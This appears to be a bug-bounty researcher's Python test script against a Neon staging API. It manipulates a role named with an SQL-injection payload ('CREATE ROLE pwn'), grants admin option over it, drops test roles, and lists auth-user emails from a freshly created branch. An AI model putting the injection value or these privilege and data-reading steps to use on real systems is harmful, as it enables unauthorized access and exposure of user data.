# -*- coding: utf-8 -*-
"""V29e: try drop pwn + admin grant on inject role; branch replication test"""
import json, ssl, time, http.client

ctx = ssl.create_default_context()
APIKEY = json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]
PROJ = "orange-sun-90493739"
BR = "br-wandering-field-w2ob6mpn"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def api(method, path, body=None):
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=60, context=ctx)
    h = {"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY,
         "Content-Type": "application/json"}
    conn.request(method, path, json.dumps(body).encode() if body else None, headers=h)
    r = conn.getresponse()
    d = r.read().decode()
    conn.close()
    return r.status, d


def uri_for(db="neondb", branch=BR, role="neondb_owner"):
    st, d = api("GET", "/api/v2/projects/%s/connection_uri?database_name=%s&role_name=%s&branch_id=%s"
                % (PROJ, db, role, branch))
    if st != 200:
        return None
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    u = urlsplit(json.loads(d)["uri"])
    q = [(k, v) for k, v in parse_qsl(u.query) if k != "channel_binding"]
    return urlunsplit((u.scheme, u.netloc, u.path, urlencode(q), u.fragment))


def main():
    out("== V29e ==")
    import psycopg
    u = uri_for()
    with psycopg.connect(u, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            try:
                cur.execute('GRANT "x""; CREATE ROLE pwn LOGIN; --" TO neondb_owner WITH ADMIN OPTION')
                out("admin option granted")
                cur.execute('DROP ROLE IF EXISTS "x""; CREATE ROLE pwn LOGIN; --"')
                out("inject role dropped")
            except Exception as ex:
                out("inject role drop failed: %s" % ex)
            try:
                cur.execute('DROP ROLE IF EXISTS "pwn"')
                out("pwn dropped")
            except Exception as ex:
                out("pwn drop failed: %s" % ex)
            cur.execute("SELECT rolname FROM pg_roles WHERE rolname NOT LIKE 'pg_%' ORDER BY rolname")
            out("roles now: %s" % [r[0] for r in cur.fetchall()])
    # create branch
    out("creating branch v29iso...")
    st, d = api("POST", "/api/v2/projects/%s/branches" % PROJ,
                {"name": "v29iso", "parent_id": BR, "database_name": "neondb"})
    out("create branch: %s" % st)
    if st >= 300:
        out(d[:300])
        return
    bid = json.loads(d)["branch"]["id"]
    out("branch id: %s" % bid)
    time.sleep(10)
    bu = uri_for("neondb", bid)
    if bu:
        with psycopg.connect(bu, connect_timeout=15) as bdc:
            bdc.autocommit = True
            with bdc.cursor() as bc:
                bc.execute("SELECT count(*) FROM neon_auth.user")
                out("new branch auth users: %d" % bc.fetchone()[0])
                bc.execute("SELECT email FROM neon_auth.user ORDER BY \"createdAt\"")
                for (e,) in bc.fetchall():
                    out("  %s" % e)
    time.sleep(2)
    st, d = api("DELETE", "/api/v2/projects/%s/branches/%s" % (PROJ, bid))
    out("drop branch: %s %s" % (st, d[:150]))
    out("done")


if __name__ == "__main__":
    main()
